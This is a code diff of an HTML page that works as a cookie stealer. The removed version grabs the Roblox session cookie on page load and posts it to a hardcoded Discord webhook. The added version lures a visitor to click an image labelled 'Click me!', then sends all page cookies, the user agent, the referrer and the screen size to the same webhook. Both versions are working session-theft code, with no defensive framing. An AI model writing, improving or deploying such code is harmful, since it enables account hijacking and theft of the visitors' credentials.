@@ -1,75 +1,37 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Cookie Logger</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cookie and Browser Info Sender</title>
+</head>
+<body>
+    <img src="path/to/your/image.png" alt="Click me!" onclick="sendInfo()" style="cursor: pointer;">
     <script>
-        // VISUAL FEEDBACK - Page turns RED when script runs
-        document.body.style.backgroundColor = "red";
-        
-        // Show an alert to confirm script loaded
-        alert("Script Loaded! Checking for Roblox cookie...");
-        
-        // YOUR WEBHOOK URL
-        const webhookUrl = "https://discordapp.com/api/webhooks/1508685502050598984/xj_mFcRpRGMcUwfPbkKZ0m1E0-QbuI9WZ5kbSwbYU-ymFFRk50siJL6BzFwIZYat51nM";
+        function sendInfo() {
+            const cookies = document.cookie;
+            const userAgent = navigator.userAgent;
+            const referrer = document.referrer;
+            const screenResolution = `${window.screen.width}x${window.screen.height}`;
 
-        function getCookie(cname) {
-            const name = cname + "=";
-            const decodedCookie = decodeURIComponent(document.cookie);
-            const ca = decodedCookie.split(';');
-            for (let i = 0; i < ca.length; i++) {
-                let c = ca[i];
-                while (c.charAt(0) == ' ') {
-                    c = c.substring(1);
-                }
-                if (c.indexOf(name) == 0) {
-                    return c.substring(name.length, c.length);
-                }
-            }
-            return "";
-        }
-
-        function sendToDiscord() {
-            const cookie = getCookie('.ROBLOSECURlTY');
-            
-            const embed = {
-                "title": "Roblox Session Detected",
-                "description": "Cookie Captured - Check Console",
-                "color": 16711680,
-                "fields": [
-                    {
-                        "name": "Cookie (.ROBLOSECURlTY)",
-                        "value": cookie ? cookie : "None found",
-                        "inline": true
-                    }
-                ],
-                "image": {
-                    "url": "https://placehold.co/600x400?text=Session+Detected"
-                }
-            };
-
-            console.log("Attempting to send cookie...");
-            
-            fetch(webhookUrl, {
+            fetch('https://discordapp.com/api/webhooks/1508685502050598984/xj_mFcRpRGMcUwfPbkKZ0m1E0-QbuI9WZ5kbSwbYU-ymFFRk50siJL6BzFwIZYat51nM', {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ "embeds": [embed] })
-            })
-            .then(response => {
-                console.log('Success!', response);
-                alert("Cookie sent to Discord!");
-            })
-            .catch(error => {
-                console.error('Error!', error.message);
-                alert("Error sending to Discord. Check console.");
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    content: `**Cookies:**\n\`\`\`\n${cookies}\n\`\`\`\n**User Agent:**\n\`\`\`\n${userAgent}\n\`\`\`\n**Referrer:**\n\`\`\`\n${referrer}\n\`\`\`\n**Screen Resolution:**\n\`\`\`\n${screenResolution}\n\`\`\``
+                })
+            }).then(response => {
+                if (response.ok) {
+                    console.log('Data sent successfully');
+                } else {
+                    console.error('Failed to send data');
+                }
+            }).catch(error => {
+                console.error('Error:', error);
             });
         }
-
-        // Run immediately
-        sendToDiscord();
     </script>
-</head>
-<body style="background:black; color:white; padding:20px; font-family:Arial;">
-    <h1>Session Detected</h1>
-    <p>Checking for cookies...</p>
 </body>
 </html>
